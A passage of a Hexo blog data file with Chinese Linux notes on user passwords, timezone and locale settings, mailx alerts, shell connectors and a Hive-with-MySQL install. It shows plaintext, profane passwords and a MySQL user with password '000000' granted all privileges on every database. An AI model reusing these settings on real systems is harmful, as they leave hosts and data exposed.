plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adduser hello</span><br><span class=\"line\">passwd hello</span><br><span class=\"line\">youmotherfucker</span><br></pre></td></tr></table></figure></p>\n<p>删除用户<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deluser hello</span><br></pre></td></tr></table></figure></p>\n<p>权限分配</p>\n<p>root–组–其他</p>\n","site":{"data":{}},"excerpt":"","more":"<p>修改密码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">passwd root</span><br><span class=\"line\">you_wanna_fucking_login_motherfucker? </span><br><span class=\"line\">you_wanna_fucking_login_motherfucker?</span><br></pre></td></tr></table></figure></p>\n<p>添加用户<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adduser hello</span><br><span class=\"line\">passwd hello</span><br><span class=\"line\">youmotherfucker</span><br></pre></td></tr></table></figure></p>\n<p>删除用户<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deluser hello</span><br></pre></td></tr></table></figure></p>\n<p>权限分配</p>\n<p>root–组–其他</p>\n"},{"title":"修改时间","date":"2018-07-10T13:09:19.000Z","_content":"```\r\n# cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\r\n修改为中国的东八区\r\n# vi /etc/sysconfig/clock\r\nZONE=\"Asia/Shanghai\"\r\nUTC=false\r\nARC=false\r\n二、配置新的时间\r\n日期设定：\r\n# date -s 2017/03/06\r\n时间设定：\r\n# date -s 18:40:00\r\n查看硬件时间（BIOS的）：\r\n    hwclock [-rw]\r\n    -r:查看现有BIOS时间，默认为－r参数\r\n    -w:将现在的linux系统时间写入BIOS中\r\n    注：当我们进行完 Linux 时间的校时后，还需要以 hwclock -w 来更新 BIOS 的时间，因为每次开机的时候，系统会重新由 BIOS 将时间读出来，所以， BIOS 才是重要的时间依据。","source":"_posts/Linux/修改时间.md","raw":"---\ntitle: 修改时间\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n```\r\n# cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\r\n修改为中国的东八区\r\n# vi /etc/sysconfig/clock\r\nZONE=\"Asia/Shanghai\"\r\nUTC=false\r\nARC=false\r\n二、配置新的时间\r\n日期设定：\r\n# date -s 2017/03/06\r\n时间设定：\r\n# date -s 18:40:00\r\n查看硬件时间（BIOS的）：\r\n    hwclock [-rw]\r\n    -r:查看现有BIOS时间，默认为－r参数\r\n    -w:将现在的linux系统时间写入BIOS中\r\n    注：当我们进行完 Linux 时间的校时后，还需要以 hwclock -w 来更新 BIOS 的时间，因为每次开机的时候，系统会重新由 BIOS 将时间读出来，所以， BIOS 才是重要的时间依据。","slug":"Linux/修改时间","published":1,"updated":"2018-07-10T13:10:09.934Z","_id":"cjjedmhak004q0gtjtb8wjvb5","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code></p>\n<h1 id=\"cp-usr-share-zoneinfo-Asia-Shanghai-etc-localtime\"><a href=\"#cp-usr-share-zoneinfo-Asia-Shanghai-etc-localtime\" class=\"headerlink\" title=\"cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\"></a>cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</h1><p>修改为中国的东八区</p>\n<h1 id=\"vi-etc-sysconfig-clock\"><a href=\"#vi-etc-sysconfig-clock\" class=\"headerlink\" title=\"vi /etc/sysconfig/clock\"></a>vi /etc/sysconfig/clock</h1><p>ZONE=”Asia/Shanghai”<br>UTC=false<br>ARC=false<br>二、配置新的时间<br>日期设定：</p>\n<h1 id=\"date-s-2017-03-06\"><a href=\"#date-s-2017-03-06\" class=\"headerlink\" title=\"date -s 2017/03/06\"></a>date -s 2017/03/06</h1><p>时间设定：</p>\n<h1 id=\"date-s-18-40-00\"><a href=\"#date-s-18-40-00\" class=\"headerlink\" title=\"date -s 18:40:00\"></a>date -s 18:40:00</h1><p>查看硬件时间（BIOS的）：<br>    hwclock [-rw]<br>    -r:查看现有BIOS时间，默认为－r参数<br>    -w:将现在的linux系统时间写入BIOS中<br>    注：当我们进行完 Linux 时间的校时后，还需要以 hwclock -w 来更新 BIOS 的时间，因为每次开机的时候，系统会重新由 BIOS 将时间读出来，所以， BIOS 才是重要的时间依据。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code></p>\n<h1 id=\"cp-usr-share-zoneinfo-Asia-Shanghai-etc-localtime\"><a href=\"#cp-usr-share-zoneinfo-Asia-Shanghai-etc-localtime\" class=\"headerlink\" title=\"cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\"></a>cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</h1><p>修改为中国的东八区</p>\n<h1 id=\"vi-etc-sysconfig-clock\"><a href=\"#vi-etc-sysconfig-clock\" class=\"headerlink\" title=\"vi /etc/sysconfig/clock\"></a>vi /etc/sysconfig/clock</h1><p>ZONE=”Asia/Shanghai”<br>UTC=false<br>ARC=false<br>二、配置新的时间<br>日期设定：</p>\n<h1 id=\"date-s-2017-03-06\"><a href=\"#date-s-2017-03-06\" class=\"headerlink\" title=\"date -s 2017/03/06\"></a>date -s 2017/03/06</h1><p>时间设定：</p>\n<h1 id=\"date-s-18-40-00\"><a href=\"#date-s-18-40-00\" class=\"headerlink\" title=\"date -s 18:40:00\"></a>date -s 18:40:00</h1><p>查看硬件时间（BIOS的）：<br>    hwclock [-rw]<br>    -r:查看现有BIOS时间，默认为－r参数<br>    -w:将现在的linux系统时间写入BIOS中<br>    注：当我们进行完 Linux 时间的校时后，还需要以 hwclock -w 来更新 BIOS 的时间，因为每次开机的时候，系统会重新由 BIOS 将时间读出来，所以， BIOS 才是重要的时间依据。</p>\n"},{"title":"修改语言设置","date":"2018-07-10T13:09:19.000Z","_content":"3、临时修改语言环境：\r\n```\r\n\r\nLinux：\r\nexport LANG=en_US.UTF-8\r\nexport LANG=zh_CN.UTF-8\r\n ```\r\n4、永久修改系统级字符集：   \r\n修改/etc/sysconfig/i18n   \r\n英文版系统：\r\n ```\r\nLANG=\"en_US.UTF-8\"\r\nSYSFONT=\"latarcyrheb-sun16\"\r\n```\r\n中文版系统：\r\n```\r\nLANG=\"zh_CN.UTF-8\"\r\nSYSFONT=\"latarcyrheb-sun16\"\r\n```\r\n","source":"_posts/Linux/修改语言设置.md","raw":"---\ntitle: 修改语言设置\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n3、临时修改语言环境：\r\n```\r\n\r\nLinux：\r\nexport LANG=en_US.UTF-8\r\nexport LANG=zh_CN.UTF-8\r\n ```\r\n4、永久修改系统级字符集：   \r\n修改/etc/sysconfig/i18n   \r\n英文版系统：\r\n ```\r\nLANG=\"en_US.UTF-8\"\r\nSYSFONT=\"latarcyrheb-sun16\"\r\n```\r\n中文版系统：\r\n```\r\nLANG=\"zh_CN.UTF-8\"\r\nSYSFONT=\"latarcyrheb-sun16\"\r\n```\r\n","slug":"Linux/修改语言设置","published":1,"updated":"2018-07-10T13:10:09.935Z","_id":"cjjedmhal004s0gtjr71paglu","comments":1,"layout":"post","photos":[],"link":"","content":"<p>3、临时修改语言环境：</p>\n<pre><code>\nLinux：\nexport LANG=en_US.UTF-8\nexport LANG=zh_CN.UTF-8\n</code></pre><p>4、永久修改系统级字符集：<br>修改/etc/sysconfig/i18n<br>英文版系统：</p>\n<pre><code>LANG=&quot;en_US.UTF-8&quot;\nSYSFONT=&quot;latarcyrheb-sun16&quot;\n</code></pre><p>中文版系统：</p>\n<pre><code>LANG=&quot;zh_CN.UTF-8&quot;\nSYSFONT=&quot;latarcyrheb-sun16&quot;\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>3、临时修改语言环境：</p>\n<pre><code>\nLinux：\nexport LANG=en_US.UTF-8\nexport LANG=zh_CN.UTF-8\n</code></pre><p>4、永久修改系统级字符集：<br>修改/etc/sysconfig/i18n<br>英文版系统：</p>\n<pre><code>LANG=&quot;en_US.UTF-8&quot;\nSYSFONT=&quot;latarcyrheb-sun16&quot;\n</code></pre><p>中文版系统：</p>\n<pre><code>LANG=&quot;zh_CN.UTF-8&quot;\nSYSFONT=&quot;latarcyrheb-sun16&quot;\n</code></pre>"},{"title":"发送邮件","date":"2018-07-10T13:09:19.000Z","_content":"安装mailx\n\n    yum install mailx\n\n配置mailx\n```\nvim /etc/mail.rc\n\n#添加\nset from=name@163.com smtp=\"smtp.163.com\"\nset smtp-auth-user=\"name@163.com\" smtp-auth-password=\"163邮箱授权码\"\n```\n163邮箱授权码要到邮箱去设置，不是密码\n\n发送邮件\n\n    echo \"a bitch has loged in \" | mail -s \"logged in\"  somename@qq.com","source":"_posts/Linux/发送邮件.md","raw":"---\ntitle: 发送邮件\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n安装mailx\n\n    yum install mailx\n\n配置mailx\n```\nvim /etc/mail.rc\n\n#添加\nset from=name@163.com smtp=\"smtp.163.com\"\nset smtp-auth-user=\"name@163.com\" smtp-auth-password=\"163邮箱授权码\"\n```\n163邮箱授权码要到邮箱去设置，不是密码\n\n发送邮件\n\n    echo \"a bitch has loged in \" | mail -s \"logged in\"  somename@qq.com","slug":"Linux/发送邮件","published":1,"updated":"2018-07-10T13:10:09.936Z","_id":"cjjedmham004u0gtjwsgnpmrf","comments":1,"layout":"post","photos":[],"link":"","content":"<p>安装mailx</p>\n<pre><code>yum install mailx\n</code></pre><p>配置mailx<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/mail.rc</span><br><span class=\"line\"></span><br><span class=\"line\">#添加</span><br><span class=\"line\">set from=name@163.com smtp=&quot;smtp.163.com&quot;</span><br><span class=\"line\">set smtp-auth-user=&quot;name@163.com&quot; smtp-auth-password=&quot;163邮箱授权码&quot;</span><br></pre></td></tr></table></figure></p>\n<p>163邮箱授权码要到邮箱去设置，不是密码</p>\n<p>发送邮件</p>\n<pre><code>echo &quot;a bitch has loged in &quot; | mail -s &quot;logged in&quot;  somename@qq.com\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>安装mailx</p>\n<pre><code>yum install mailx\n</code></pre><p>配置mailx<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/mail.rc</span><br><span class=\"line\"></span><br><span class=\"line\">#添加</span><br><span class=\"line\">set from=name@163.com smtp=&quot;smtp.163.com&quot;</span><br><span class=\"line\">set smtp-auth-user=&quot;name@163.com&quot; smtp-auth-password=&quot;163邮箱授权码&quot;</span><br></pre></td></tr></table></figure></p>\n<p>163邮箱授权码要到邮箱去设置，不是密码</p>\n<p>发送邮件</p>\n<pre><code>echo &quot;a bitch has loged in &quot; | mail -s &quot;logged in&quot;  somename@qq.com\n</code></pre>"},{"title":"命令连接符","date":"2018-07-10T13:09:19.000Z","_content":"(1)  ; \r\n分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。\r\n\r\n(2) ||\r\n逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。\r\n\r\n(3) &&\r\n逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。\r\n\r\n(4) |\r\n管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。\r\n例 ls | grep *.txt","source":"_posts/Linux/命令连接符.md","raw":"---\ntitle: 命令连接符\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n(1)  ; \r\n分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。\r\n\r\n(2) ||\r\n逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。\r\n\r\n(3) &&\r\n逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。\r\n\r\n(4) |\r\n管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。\r\n例 ls | grep *.txt","slug":"Linux/命令连接符","published":1,"updated":"2018-07-10T13:10:09.937Z","_id":"cjjedmhan004w0gtjekq5n40u","comments":1,"layout":"post","photos":[],"link":"","content":"<p>(1)  ;<br>分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。</p>\n<p>(2) ||<br>逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。</p>\n<p>(3) &amp;&amp;<br>逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。</p>\n<p>(4) |<br>管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。<br>例 ls | grep *.txt</p>\n","site":{"data":{}},"excerpt":"","more":"<p>(1)  ;<br>分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。</p>\n<p>(2) ||<br>逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。</p>\n<p>(3) &amp;&amp;<br>逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。</p>\n<p>(4) |<br>管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。<br>例 ls | grep *.txt</p>\n"},{"title":"安装Hive，本地模式","date":"2018-07-10T13:09:19.000Z","_content":"- #### 环境\n> CentOS6.5\n\n> jdk1.8\n\n> MySQL5.6\n\n> Hadoop2.7\n\nmysql要用原生的若果是centOS会自带MariaDB，不要用。\n\n[CentOS上MySQL安装]()\n- #### 安装hive\n下载hive压缩包\n\n解压\n\n然后放到一个单独的目录下（不放也行）\n\n```\nwget url\ntar -zxvf   apache-hive-2.2-bin.tar.gz\nmv apache-hive-2.2-bin hive\n```\n不用编译，然后配置就好了\n\n- #### 配置hive\n- ##### 环境变量\n```\nvim /etc/profile\n#在最后加上下面内容，第一行是hive的绝对路径\nexport HIVE_HOME=/usr/hive\nexport PATH=$HIVE_HOME/bin:$HIVE_HOME/conf:$PATH\n#编辑好后保存\n：wq\n#保存环境变量\nsource /etc/profile\n```\n- ##### MySQL\n这里假装MySQL已经装好了\n\n新建一个用户hive,密码为000000。然后新建库hive，这些配置在hive-site.xml中会用到。\n```\nmysql -u root -p #进入MySQL\n#配置如下\nCREATE USER 'hive'@'localhost' IDENTIFIED BY '000000';\ngrant all privileges on *.* to 'hive'@'localhost' identified by 'hive';\nflush privileges;\n```\n- ##### 配置驱动程序\n需要把MySQL驱动的jar包下载下来然后放到hive的lib目录下。\n```\nwget http://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.39.tar.gz\ntar -zxvf mysql-connector-java-5.1.39.tar.gz # 解压\ncp mysql-connector-java-5.1.39/mysql-connector-java-5.1.39-bin.jar /usr/hive/lib\n```\n- ##### 配置hive-site.xml\n\n到hive的安装目录。目录里是没有hive-site.xml的，但是有模板，把模板复制到hive-site.xml中。然后进行编辑。\n\n模板中内容很多，但是需要改的地方只有几个。所以需要查找内容再修改。最好把文件下载到本地改好再放回。\n\n在修改之前要先建一个临时文件目录，配置的时候会用到。这里是\n> mkdir /usr/Hadoop/hive/iotmp\n\n```\ncd conf   #切换到配置目录下\ncp hive-default.xml.template hive-site.xml    #复制一份\nvim hive-site.xml     #修改\n```\n需要修改的地方如下（修改的内容在文件中不是连续的，要找全）：\n```\n <!-- 数据库地址 -->\n<property>\n    <name>javax.jdo.option.ConnectionURL</name>\n    <value>jdbc:mysql://localhost:3306/hive</value>\n    <description>JDBC connect string for a JDBC metastore</description>\n</property>\n <!-- 数据库连接驱动 -->\n<property>\n   <name>javax.jdo.option.ConnectionDriverName</name>\n   <value>com.mysql.jdbc.Driver</value>\n   <description>Driver class name for a JDBC metastore</description>\n</property>\n <!-- 数据库名字-->\n<property>\n   <name>javax.jdo.option.ConnectionUserName</name>\n   <value>hive</value>\n   <description>Username to use against metastore database</description>\n</property>\n <!-- 数据库密码 -->\n<property>\n   <name>javax.jdo.option.ConnectionPassword</name>\n   <value>000000</value>\n   <description>password to use against metastore database</description>\n</property>\n <!-- 下面--四个---的配置都是临时存储目录，自己新建然后填上绝对路径-->\n<property>\n    <name>hive.exec.local.scratchdir</name>\n    <value>/usr/Hadoop/hive/iotmp</value>\n    <description>Local scratch space for Hive jobs</description>\n  </property>\n<property>\n    <name>hive.downloaded.resources.dir</name>\n    <value>/usr/Hadoop/hive/iotmp</value>\n    <description>Temporary local directory for added resources in the remote file system.</description>\n</property>\n<property>\n    <name>hive.server2.logging.operation.log.location</name>\n    <value>/usr/Hadoop/hive/iotmp</value>\n    <description>Top level directory where operation logs are stored if logging functionality is enabled</description>\n</property>\n<property>\n    <name>hive.querylog.location</name>\n    <value>/usr/Hadoop/hive/iotmp</value>\n    <description>Location of Hive run time structured log file</description>\n</property>\n```\n- ##### 配置hive-env.sh\nhive-env也要从模板复制过去然后修改。\n\n赋值之后打开，要修改的内容被注释掉了可以打开注释修改也可以直接在末尾添加内容。\n```\ncp hive-env.sh.template hive-env.sh    #复制\nvim hive-env  #打开\n#在末尾添加下面内容\n\n# Hadoop的目录\nHADOOP_HOME=/usr/hadoop\n\n# hive的配置文件目录\nexport HIVE_CONF_DIR=/usr/hive/conf\n\n：wq #保存退出\n```\n- ##### 新建元数据sechme（这个单词还不知道怎么翻译）\n切换到hive的bin目录下，然后新建元数据sechme.\n这里名字要和mysql对应\n```\ncd /usr/hive/bin\n#新建\n./schematool -initSchema -dbType mysql\n```\n- #### 启动hive\n启动Hadoop\n启动MySQL\n启动hive\n在控制台输入hive\n出现下面输出\n```\nLogging initialized using configuration in jar:file:/usr/Hadoop/hive/hive/lib/hive-common-2.0.1.jar!/hive-log4j2.properties\nHive-on-MR is deprecated in Hive 2 and may not be available in the future versions. Consider using a different execution engine (i.e. tez, spark) or using Hive 1.X releases.\nhive> \n```\n然后输入show tables;不报错就是安装好了。\n```\nhive> show tables;\nOK\nTime taken: 2.42 seconds\nhive>\n```","source":"_posts/Linux/安装Hive，本地模式.md","raw":"---\ntitle: 安装Hive，本地模式\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n- #### 环境\n> CentOS6.5\n\n> jdk1.8\n\n> MySQL5.6\n\n> Hadoop2.7\n\nmysql要用原生的若果是centOS会自带MariaDB，不要用。\n\n[CentOS上MySQL安装]()\n- #### 安装hive\n下载hive压缩包\n\n解压\n\n然后放到一个单独的目录下（不放也行）\n\n```\nwget url\ntar -zxvf   apache-hive-2.2-bin.tar.gz\nmv apache-hive-2.2-bin hive\n```\n不用编译，然后配置就好了\n\n- #### 配置hive\n- ##### 环境变量\n```\nvim /etc/profile\n#在最后加上下面内容，第一行是hive的绝对路径\nexport HIVE_HOME=/usr/hive\nexport PATH=$HIVE_HOME/bin:$HIVE_HOME/conf:$PATH\n#编辑好后保存\n：wq\n#保存环境变量\nsource /etc/profile\n```\n- ##### MySQL\n这里假装MySQL已经装好了\n\n新建一个用户hive,密码为000000。然后新建库hive，这些配置在hive-site.xml中会用到。\n```\nmysql -u root -p #进入MySQL\n#配置如下\nCREATE USER 'hive'@'localhost' IDENTIFIED BY '000000';\ngrant all privileges on *.* to 'hive'@'localhost' identified by 'hive';\nflush privileges;\n```\n- ##### 配置驱动程序\n需要把MySQL驱动的jar包下载下来然后放到hive的lib目录下。\n```\nwget http://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.39.tar.gz\ntar -zxvf mysql-connector-java-5.1.39.tar.gz # 解压\ncp mysql-connector-java-5.1.39/mysql-connector-java-5.1.39-bin.jar /usr/hive/lib\n```\n- ##### 配置hive-site.xml\n\n到hive的安装目录。目录里是没有hive-site.xml的，但是有模板，把模板复制到hive-site.xml中。然后进行编辑。\n\n模板中内容很多，但是需要改的地方只有几个。所以需要查找内容再修改。最好把文件下载到本地改好再放回。\n\n在修改之前要先建一个临时文件目录，配置的时候会用到。这里是\n> mkdir /usr/Hadoop/hive/iotmp\n\n```\ncd conf   #切换到配置目录下\ncp hive-default.xml.template hive-site.xml    #复制一份\nvim hive-site.xml     #修改\n```\n需要修改的地方如下（修改的内容在文件中不是连续的，要找全）：\n```\n <!-- 数据库地址 -->\n<property>\n    <name>javax.jdo.option.ConnectionURL</name>\n    <value>jdbc:mysql://localhost:3306/hive</value>\n    <description>JDBC connect string for a JDBC metastore</description>\n</property>\n <!-- 数据库连接驱动 -->\n<property>\n   <name>javax.jdo.option.ConnectionDriverName</name>\n   <value>com.mysql.jdbc.Driver</value>\n   <description>Driver class name for a JDBC metastore</description>\n</property>\n <!-- 数据库名字-->\n<property>\n   <name>javax.jdo.option.ConnectionUserName</name>\n   <value>hive</value>\n   <description>Username to use against metastore database</description>\n</property>\n <!-- 数据库密码 -->\n<property>\n   <name>javax.jdo.option.ConnectionPassword</name>\n   <value>000000</value>\n   <description>password to use against metastore database</description>\n</property>\n <!-- 下面--四个---的配置都是临时存储目录，自己新建然后填上绝对路径-->\n<property>\n    <name>hive.exec.local.scratchdir</name>\n    <value>/usr/Hadoop/hive/iotmp</value>\n    <description>Local scratch space for Hive jobs</description>\n  </property>\n<property>\n    <name>hive.downloaded.resources.dir</name>\n    <value>/usr/Hadoop/hive/iotmp</value>\n    <description>Temporary local directory for added resources in the remote file system.</description>\n</property>\n<property>\n    <name>hive.server2.logging.operation.log.location</name>\n    <value>/usr/Hadoop/hive/iotmp</value>\n    <description>Top level directory where operation logs are stored if logging functionality is enabled</description>\n</property>\n<property>\n    <name>hive.querylog.location</name>\n    <value>/usr/Hadoop/hive/iotmp</value>\n    <description>Location of Hive run time structured log file</description>\n</property>\n```\n- ##### 配置hive-env.sh\nhive-env也要从模板复制过去然后修改。\n\n赋值之后打开，要修改的内容被注释掉了可以打开注释修改也可以直接在末尾添加内容。\n```\ncp hive-env.sh.template hive-env.sh    #复制\nvim hive-env  #打开\n#在末尾添加下面内容\n\n# Hadoop的目录\nHADOOP_HOME=/usr/hadoop\n\n# hive的配置文件目录\nexport HIVE_CONF_DIR=/usr/hive/conf\n\n：wq #保存退出\n```\n- ##### 新建元数据sechme（这个单词还不知道怎么翻译）\n切换到hive的bin目录下，然后新建元数据sechme.\n这里名字要和mysql对应\n```\ncd /usr/hive/bin\n#新建\n./schematool -initSchema -dbType mysql\n```\n- #### 启动hive\n启动Hadoop\n启动MySQL\n启动hive\n在控制台输入hive\n出现下面输出\n```\nLogging initialized using configuration in jar:file:/usr/Hadoop/hive/hive/lib/hive-common-2.0.1.jar!/hive-log4j2.properties\nHive-on-MR is deprecated in Hive 2 and may not be available in the future versions. Consider using a different execution engine (i.e. tez, spark) or using Hive 1.X releases.\nhive> \n```\n然后输入show tables;不报错就是安装好了。\n```\nhive> show tables;\nOK\nTime taken: 2.42 seconds\nhive>\n```","slug":"Linux/安装Hive，本地模式","published":1,"updated":"2018-07-10T13:10:09.939Z","_id":"cjjedmhao004y0gtj32beaal8","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h4><blockquote>\n<p>CentOS6.5</p>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<p>jdk1.8</p>\n</blockquote>\n<blockquote>\n<p>MySQL5.6</p>\n</blockquote>\n<blockquote>\n<p>Hadoop2.7</p>\n</blockquote>\n<p>mysql要用原生的若果是centOS会自带MariaDB，不要用。</p>\n<p><a href=\"\">CentOS上MySQL安装</a></p>\n<ul>\n<li><h4 id=\"安装hive\"><a href=\"#安装hive\" class=\"headerlink\" title=\"安装hive\"></a>安装hive</h4>下载hive压缩包</li>\n</ul>\n<p>解压</p>\n<p>然后放到一个单独的目录下（不放也行）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget url</span><br><span class=\"line\">tar -zxvf   apache-hive-2.2-bin.tar.gz</span><br><span class=\"line\">mv apache-hive-2.2-bin hive</span><br></pre></td></tr></table></figure>\n<p>不用编译，然后配置就好了</p>\n<ul>\n<li><h4 id=\"配置hive\"><a href=\"#配置hive\" class=\"headerlink\" title=\"配置hive\"></a>配置hive</h4></li>\n<li><h5 id=\"环境变量\"><a href=\"#环境变量\" class=\"headerlink\" title=\"环境变量\"></a>环境变量</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/profile</span><br><span class=\"line\">#在最后加上下面内容，第一行是hive的绝对路径</span><br><span class=\"line\">export HIVE_HOME=/usr/hive</span><br><span class=\"line\">export PATH=$HIVE_HOME/bin:$HIVE_HOME/conf:$PATH</span><br><span class=\"line\">#编辑好后保存</span><br><span class=\"line\">：wq</span><br><span class=\"line\">#保存环境变量</span><br><span class=\"line\">source /etc/profile</span><br></pre></td></tr></table></figure>\n</li>\n<li><h5 id=\"MySQL\"><a href=\"#MySQL\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h5><p>这里假装MySQL已经装好了</p>\n</li>\n</ul>\n<p>新建一个用户hive,密码为000000。然后新建库hive，这些配置在hive-site.xml中会用到。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root -p #进入MySQL</span><br><span class=\"line\">#配置如下</span><br><span class=\"line\">CREATE USER &apos;hive&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;000000&apos;;</span><br><span class=\"line\">grant all privileges on *.* to &apos;hive&apos;@&apos;localhost&apos; identified by &apos;hive&apos;;</span><br><span class=\"line\">flush privileges;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h5 id=\"配置驱动程序\"><a href=\"#配置驱动程序\" class=\"headerlink\" title=\"配置驱动程序\"></a>配置驱动程序</h5><p>需要把MySQL驱动的jar包下载下来然后放到hive的lib目录下。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.39.tar.gz</span><br><span class=\"line\">tar -zxvf mysql-connector-java-5.1.39.tar.gz # 解压</span><br><span class=\"line\">cp mysql-connector-java-5.1.39/mysql-connector-java-5.1.39-bin.jar /usr/hive/lib</span><br></pre></td></tr></table></figure>\n</li>\n<li><h5 id=\"配置hive-site-xml\"><a href=\"#配置hive-site-xml\" class=\"headerlink\" title=\"配置hive-site.xml\"></a>配置hive-site.xml</h5></li>\n</ul>\n<p>到hive的安装目录。目录里是没有hive-site.xml的，但是有模板，把模板复制到hive-site.xml中。然后进行编辑。</p>\n<p>模板中内容很多，但是需要改的地方只有几个。所以需要查找内容再修改。最好把文件下载到本地改好再放回。</p>\n<p>在修改之前要先建一个临时文件目录，配置的时候会用到。这里是</p>\n<blockquote>\n<p>mkdir /usr/Hadoop/hive/iotmp</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd conf   #切换到配置目录下</span><br><span class=\"line\">cp hive-default.xml.template hive-site.xml    #复制一份</span><br><span class=\"line\">vim hive-site.xml     #修改</span><br></pre></td></tr></table></figure>\n<p>需要修改的地方如下（修改的内容在文件中不是连续的，要找全）：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 